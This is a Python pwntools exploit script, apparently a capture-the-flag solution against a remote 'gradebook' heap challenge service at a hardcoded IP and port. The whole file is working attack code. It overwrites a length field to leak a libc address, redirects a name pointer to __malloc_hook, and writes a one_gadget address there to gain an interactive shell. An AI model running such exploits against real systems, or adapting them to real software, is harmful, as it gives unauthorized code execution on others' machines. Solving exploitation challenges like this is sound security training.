from pwn import *

class Gradebook():
    def __init__(self,conn):
        conn.recv()
        self.conn = conn
    
    def AddStudent(self,student_id, length, name):
        self.conn.sendline(b'1')
        self.conn.recv()
        self.conn.sendline(student_id)
        self.conn.recv()
        self.conn.sendline(length)
        self.conn.recv()
        self.conn.sendline(name)
        self.conn.recv()
        return
    
    def ListGradebook(self):
        self.conn.sendline(b'2')
        output = self.conn.recv()
        return output
    
    def UpdateGrade(self,student_id, grade):
        self.conn.sendline(b'3')
        self.conn.recv()
        self.conn.sendline(student_id)
        self.conn.sendline(grade)
        self.conn.recv()
        return

    def UpdateName(self,student_id, new_name):
        self.conn.sendline(b'4')
        self.conn.recv()
        self.conn.sendline(student_id)
        self.conn.recv()
        self.conn.sendline(new_name)
        self.conn.recv()
        return
    
    def ClearGradebook(self):
        self.conn.sendline(b'5')
        self.conn.recv()
        return


def main():
    context.binary = elf = ELF('./gradebook')
    libc = ELF('./libc.so.6')
    #context.log_level = 'debug'
    #target = process('./heap_chal')
    target = remote("20.115.18.240",2250)

    # Add a student
    gradebook = Gradebook(target)
    gradebook.AddStudent(b'1',b'20',b'filler')
    gradebook.AddStudent(b'5000',b'5000',b'filler')
    gradebook.AddStudent(b'134257',b'134257',b'filler')
    gradebook.ClearGradebook()
    gradebook.AddStudent(b'1',b'20',b'filler')

    # Overwrite length
    gradebook.UpdateGrade(b'1','18446744073709551613')
    gradebook.UpdateName(b'1',b'x'*31)

    output = gradebook.ListGradebook()

     
    leaked_address = u64(output[39:45] + b'\x00\x00')
    print(f'Leaked Heap Address: {hex(leaked_address)}')
    
    leaked_address = p64(leaked_address)
    libc_base = u64(leaked_address) -0x1ebbe0
    print(f'Libc Base: {hex(libc_base)}')

    one_gadget = p64(libc_base + 0xe6c81)

    print(f'One Gadget Address: {hex(u64(one_gadget))}')
    revert_headers = b'x'*16 + p64(0) + p64(0x1391) + leaked_address + leaked_address
    gradebook.UpdateName(b'1',revert_headers)
    gradebook.AddStudent(b'2', b'20', b'20') 
    gradebook.AddStudent(b'3',b'20',b'20')
    gradebook.AddStudent(b'4',b'20',b'20')


    # Overwrite 4's name pointer using 3's name
    malloc_hook = libc.symbols['__malloc_hook']
    free_hook = libc.symbols['__free_hook']
    print(f'Malloc Hook Address: {hex(libc_base + malloc_hook)}')
    gradebook.UpdateGrade(b'3',b'18446744073709551613')
        
    malicious_name = b'x'*32 + p64(0x34) + p64(9223372036854775807) + p64(libc_base + malloc_hook)
    gradebook.UpdateName(b'3', malicious_name)
    
    # Write one_gadget pointer at malloc_hook
    print(one_gadget)
    gradebook.UpdateName(b'4', one_gadget)

    print(f'Malloc Hook Address: {hex(libc_base + malloc_hook)}')
    print(f'Leaked Heap Address: {hex(u64(leaked_address))}')
    print(f'Libc Base: {hex(libc_base)}')
    print(f'One Gadget Address: {hex(u64(one_gadget))}')

    # Add student to call malloc hook which gets one_gdaget
    gradebook.conn.sendline(b'1')
    gradebook.conn.interactive()

if __name__ == '__main__':
    main()
